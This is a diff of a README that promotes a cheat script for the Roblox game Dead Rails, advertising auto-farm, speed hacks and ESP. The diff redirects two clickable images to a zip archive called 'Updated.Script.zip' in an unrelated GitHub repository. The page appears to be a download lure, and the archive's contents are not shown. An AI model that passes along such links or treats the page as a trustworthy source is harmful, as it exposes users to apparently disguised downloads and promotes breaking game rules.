@@ -6,10 +6,10 @@ If you're looking for the **best Dead Rails script for Roblox**, you've come to 
 **Dead Rails** is a popular **horror-survival game** on Roblox where players must survive against terrifying creatures while navigating a dark, eerie environment. The game features **intense gameplay, jump scares, and strategic mechanics**, making it a thrilling experience.  
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 To gain an **edge in Dead Rails**, many players use **scripts**—custom codes that enhance gameplay with **auto-farm, speed hacks, ESP, and more**.  
